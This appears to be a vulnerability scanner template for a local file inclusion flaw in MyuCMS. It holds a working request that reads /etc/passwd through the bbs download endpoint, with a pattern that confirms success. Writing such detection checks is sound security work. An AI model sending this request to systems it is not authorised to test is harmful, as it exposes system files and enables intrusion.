id: myucms-lfr
name: MyuCMS - Local File Inclusion
severity: high
confidence: tentative
description: MyuCMS is vulnerable to local file inclusion.
reference: CWE-22
tags:
- myucms
- lfi
- vuln
requests:
- method: GET
  path: /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  condition: or
